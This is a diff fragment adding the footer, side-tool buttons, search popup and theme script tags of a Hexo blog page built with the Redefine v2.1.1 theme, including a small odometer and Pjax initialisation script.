+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.1</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+<script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/utils.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/main.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/navbarShrink.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/scrollTopBottom.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/lightDarkSwitch.js"></script>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/localSearch.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/codeBlock.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/runtime.js"></script>
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/odometer.min.js"></script>
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/Typed.min.js"></script>
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/typed.js"></script>
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/tocToggle.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/anime.min.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/toc.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
